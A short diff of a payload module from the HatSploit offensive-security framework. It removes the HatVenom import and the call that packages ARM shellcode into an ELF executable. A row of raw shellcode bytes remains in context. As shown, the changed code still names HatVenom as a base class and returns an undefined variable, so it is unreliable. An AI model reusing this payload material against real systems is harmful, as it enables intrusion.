@@ -5,7 +5,6 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
-from hatvenom import HatVenom
 from hatsploit.lib.payload import Payload
 
 
@@ -33,5 +32,4 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x02\x27\x01\xdf\xc0\x46\xff\xf7\xfa\xff"
         )
 
-        payload = self.generate('elf', 'armle', shellcode)
         return payload
